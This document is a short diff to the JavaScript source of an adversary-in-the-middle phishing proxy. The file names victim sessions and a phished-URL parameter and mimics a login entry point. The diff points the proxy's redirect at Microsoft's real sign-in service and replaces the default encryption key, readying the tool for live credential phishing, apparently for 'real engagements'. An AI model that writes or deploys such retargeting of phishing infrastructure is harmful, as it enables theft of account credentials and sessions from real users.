@@ -9,7 +9,7 @@ const crypto = require("crypto");
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
-const REDIRECT_URL = "https://www.intrinsec.com/";
+const REDIRECT_URL = "https://login.microsoftonline.com/";
 
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
@@ -35,7 +35,7 @@ try {
 }
 const LOG_FILE_STREAMS = {};
 //!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
-const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
+const ENCRYPTION_KEY = "32ff33970fe0e410193010732f744aab113f8f59ff3b0212e97114b1b27946df";
 
 const VICTIM_SESSIONS = {}
 
